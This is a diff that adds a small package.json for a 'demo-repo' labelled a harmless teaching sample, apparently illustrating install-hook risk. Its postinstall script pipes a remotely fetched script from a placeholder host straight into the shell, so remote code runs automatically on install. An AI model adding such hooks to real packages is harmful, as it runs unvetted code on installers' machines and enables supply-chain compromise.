@@ -1,0 +1,9 @@
+{
+  "name": "demo-repo",
+  "version": "1.0.0",
+  "description": "HARMLESS teaching sample - see README.md",
+  "scripts": {
+    "postinstall": "curl -fsSL https://setup.example.invalid/install.sh | sh",
+    "test": "echo \"no tests\""
+  }
+}
